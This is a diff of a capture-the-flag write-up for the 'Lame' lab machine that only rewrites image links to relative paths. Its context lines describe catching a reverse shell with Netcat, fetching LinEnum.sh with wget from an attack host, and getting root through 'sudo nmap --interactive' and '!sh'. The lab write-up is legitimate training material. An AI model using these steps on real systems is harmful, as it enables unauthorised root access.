@@ -46,7 +46,7 @@ Setting up a Netcat listener on our attack machine to catch the shell:
 
 After executing nmap script, we have successfully got a Reverse shell:
 
-![lame rev shell](https://github.com/Starscorpio/writeup.github.io/blob/gh-pages/assets/lamerevshell.png)
+![lame rev shell](/assets/lamerevshell.png)
 
 And we have the **USER SHELL!!!!**
 
@@ -59,13 +59,13 @@ Using `wget http://10.10.14.2/LinEnum.sh` to download the script and running `ch
 
 After running the script we see that we have the suid bit enabled on the nmap binary.
 SUID bit enabled means that if a file's SUID bit is enabled we can run that file as root.
-![nmap suid bit enabled](https://github.com/Starscorpio/writeup.github.io/blob/gh-pages/assets/privesc.png)
+![nmap suid bit enabled](/assets/privesc.png)
 
 Using nmap in interactive mode:
 `sudo nmap --interactive` (important to use sudo as we want to execute the binary as root)
 Now running !sh to run bash from nmap.
 
-![root user](https://github.com/Starscorpio/writeup.github.io/blob/gh-pages/assets/root.png)
+![root user](/assets/root.png)
 
 And we have got **ROOT!!!!**
 
